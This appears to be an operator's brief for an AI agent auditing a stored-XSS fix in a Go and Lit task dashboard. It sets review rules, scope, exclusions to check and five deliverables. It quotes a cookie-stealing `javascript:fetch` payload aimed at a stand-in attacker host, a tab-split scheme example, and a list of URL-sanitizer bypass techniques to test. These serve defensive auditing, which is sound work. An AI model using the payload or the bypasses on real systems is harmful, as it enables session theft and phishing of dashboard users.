# audit-xss-r1 — security audit: what does this actually prevent in production?

Your working tree is `/workspace`. Confirm with `git rev-parse --show-toplevel`, and verify
branch `url-scheme-validation` and commit **`d4c4e6b629ade1d0725bc303c0acf962838f03c9`**.
**Do NOT create any directory named in this brief.**

**You are one of three independent legs reviewing this change.** A code-review leg and a
test-engineering leg are running in parallel, in their own clones, on the same commit, on
different axes. **You will not see their reports and they will not see yours.** Do not scope
your work around what you assume they cover, and **do not defer a security question to them.**

**Your axis is production effect**: does this change actually close the vulnerability it claims
to close, for a real attacker, in the deployed configuration — and what remains open?

## Baseline `[MEASURED by me at d4c4e6b in this exact clone]`

| check | result |
|---|---|
| `go build ./...` | exit 0 |
| `cd web && npm test` | exit 0 — `task-ready`, `safe-url: ok`, `url-binding-scan: ok` |
| `git status --porcelain` | empty |

Base of the branch is `7a0f220` = `origin/main` = **live in production**. At that base:
`go test ./...` exit 0, 10 packages ok; `go vet ./...` exit 1 with **exactly 4** pre-existing
copylocks in `internal/server/server.go` at 1500/1610/1818/1995 `[MEASURED by me]`.
`internal/server` has a `TestWatchTasks*` flake at ~**8% per full-suite run**
`[MEASURED-BY-test-194-r8]` — it fired on my first run in a sibling clone tonight and cleared in
five re-runs. **Read failing test NAMES, never counts.**

## Rules

- **Do not push. Do not modify production code.** Probes and harnesses are fine; revert them
  and assert `git status --porcelain` empty.
- **Do not touch or inspect the production deployment.** Confine yourself to this tree.
- **Exit codes come from the child process, never through a pipe.**
- **A negative claim needs a positive control.** Every one.
- **Predict before measuring**; report misses.
- **Do not assert exploitation you did not observe.** Say what is established and what is
  inferred, in those words. See the standing correction below — this is not a formality here.
- Tags: `[MEASURED]` = you ran it. `[MEASURED-BY-<x>]` = relayed, re-measure.
- **My briefs have contained at least one error in twelve consecutive rounds.** Listing every
  place this brief is wrong is a **required deliverable**.

---

# What the change claims to fix

A **stored XSS**: a caller holding only `task:write` submits a URL field valued
`javascript:fetch('//attacker/'+document.cookie)`. It was persisted verbatim, returned verbatim,
and rendered directly into an `href` in the Lit dashboard. No validation in Go, none in
TypeScript, no sanitizer in Lit (`setSanitizer` has zero occurrences in `web/src`).

**This is not covered by IAP** — attacker and victim are both already inside that boundary and
the attack travels through content the attacker legitimately wrote.

| commit | scope |
|---|---|
| `4187910` | Server: `{http, https}` allow-list at the `UpdateTask` write boundary |
| `80cab87` | Same allow-list on the collection-import ingress |
| `f0ab53f` | Frontend: shared `safeHref()`, two call-site fixes, tree-wide scanner, `target="_blank"` pin |

## A standing correction you must not re-inflate

**I over-claimed this vulnerability earlier tonight and was corrected.** I wrote that a user who
clicks the link "executes attacker script in the dashboard origin with their session."
**Nobody has measured that.** Both anchors carry `target="_blank"`, and engines block
`javascript:` navigation into a new browsing context. A prior audit rendered the real template
under JSDOM, confirmed the href is emitted **verbatim**, and then **explicitly declined to
assert execution** because JSDOM implements no navigation. That was the right call.

**Established:** attacker-controlled text reaches an `href` with no validation anywhere.
**Not established:** that `javascript:` executes on click in a real browser.

The defensible harm is an arbitrary attacker-chosen URL rendered under first-party dashboard
chrome — credential phishing with a trusted affordance — plus the fact that **`target="_blank"`
was an incidental mitigation that nothing pinned.** (This change pins it; assess whether the pin
is meaningful.) `data:` and `vbscript:` sit in the same open set and are not equally mitigated.

**Do not repeat my execution claim, and do not let the change's own report inherit it either.**
If you have any way to settle real navigation behaviour, that is genuinely valuable — and a
negative there needs a positive control like everything else.

## The author's report — read it SECOND

`/scion-volumes/scratchpad/projects/farmtable/reports/dev-xss-url.md`. Form your own view of the
attack surface first, then read it, and treat every claim as unverified.

# Specific things I want established

1. **Is the guard actually complete at the write boundary?** The author enumerated **3
   client-controlled ingress paths** for these fields and guarded all 3. Enumerate them yourself
   and **report your own denominator.** Note that this exact enumeration has already produced
   two independent counting errors tonight: I wrote that the proto declares `string.uri` on
   "two" fields; a parallel audit independently also wrote "two" — **a different two**. There are
   **four** (lines 241, 265, 343, 633) `[MEASURED by me]`. **Two independent partial
   enumerations agreeing on a count is not corroboration.** Re-measure everything, including
   that four.

2. **Interrogate the deliberate exclusions.** The author consciously left several writers
   unguarded, each with a stated reason:
   - **Platform sync** (`internal/platform/github/*` writes `remote_url`/`html_url` from the
     GitHub API) — reasoning: not client-controlled, values come from upstream. **Is that true?**
     Can a value an attacker controls reach that path — via an issue body, a PR field, a webhook,
     a repo they own, or a self-hosted/enterprise endpoint? This is the single exclusion most
     likely to be wrong, because "trusted upstream" arguments usually rest on an assumption
     about the upstream that nobody checked.
   - **`Collection.remote_data`** (`export_import.go:332`) — client-controlled, but claimed to
     reach no `href`. Verify.
   - **`Attachment.url`** — claimed to be an entirely **dead field**: no write path, no read
     path, no renderer. If that is true it is fine; if it is wrong, a `uri`-constrained field is
     unguarded. Verify with positive controls.

3. **The `RemoteData` key list.** `remote_url` lands in an **untyped `map[string]any`**. The
   author validates the keys that `convert.go` surfaces as URL-typed, via a named constant with
   a "keep in sync with `convert.go`" comment. **A comment is not a control.** Establish what
   happens when the two drift: if a new URL-bearing key is added to `convert.go` and not to the
   constant, is the field unguarded, and does anything detect it? This is a closed enumeration
   guarding an open set — flag it at the severity you judge correct.

4. **Defence in depth for rows already in the database.** The server fix does nothing about
   malicious URLs **already persisted**; the frontend guard is what neutralises them. So assess
   the frontend guard as **the only control for existing data**: can `safeHref()` be bypassed?
   Try scheme-confusion, unicode, encoded forms, embedded credentials, `blob:`, `filesystem:`,
   whitespace and control characters, and anything else in the open set. The author reports that
   Go's `net/url` and the browser's WHATWG parser **disagree** about `java\tscript:alert(1)` —
   Go errors, WHATWG strips the tab and yields `protocol === 'javascript:'`. **Where else do the
   two parsers disagree, and does any disagreement produce a value the server accepts and the
   client renders?** That intersection is the exploitable set.

5. **What is NOT fixed, and how bad is it?** The author lists residual risk: no data migration
   for already-poisoned rows; platform-sync writes unvalidated; execution untested. **Rate each,
   and add the ones they missed.** Is a cleanup migration warranted, and what would it have to
   examine?

6. **Anything adjacent.** Two independent audits tonight landed on `href` sinks from unrelated
   directions. Adjacent territory has been productive. Surface what you find; do not chase it.

# Context you need, that is not yours to fix or to re-litigate

- `[MEASURED by me at this commit]`: **the Makefile is untouched on this branch.** `make test` is
  `go test ./...`; `make web` is `cd web && npm ci && npm run build`; **no Makefile target and no
  documented command runs `npm test`** — so the new tree-wide scanner and every frontend pin in
  this change run only when a human types `npm test`. A separate track is already fixing this.
  **Do not file it as a defect in this change.** I want your judgement on one thing only:
  **does that change your severity rating for anything here?**
- **Already assigned elsewhere, do not scope fixes for them:** the absence of any
  Content-Security-Policy on the dashboard origin; the markdown sanitizer's deny-list; and five
  separate auth/CORS/scope findings (`FARMTABLE_OPEN_ACCESS`, 0.0.0.0 bind, permissive CORS,
  empty-scopes wildcard, inert protovalidate) currently being independently verified. **If any of
  them changes your assessment of THIS change's blast radius, say so and use it** — a rating that
  ignores the surrounding trust boundary is not honest. Just do not open fixes for them.

# Deliverables — you are not done until all five exist

1. **A report at `/scion-volumes/scratchpad/projects/farmtable/reports/audit-xss-r1.md`** with a
   verdict — **APPROVE** or **REQUEST CHANGES** — and findings numbered, severity-classified
   (Critical/High/Medium/Low/Informational), each with location, evidence, impact and a
   recommendation.
2. **An explicit before/after statement**: what an attacker could do at `7a0f220`, and what they
   can do at `d4c4e6b`. If the answer to the second is "the same thing by a different route",
   that is the most important sentence in your report and it belongs at the top.
3. **Your ingress denominator**, showing your method and what your method would miss.
4. **A project log entry** in `.design/project-log/`, **committed** (the only thing you commit).
5. **An explicit list of every place this brief was wrong** — including any count, line number or
   path I relayed that does not match this tree. Twelve consecutive rounds; assume there are more.

**You MUST produce all five deliverables and then mark the task complete.**

**Do NOT push.**
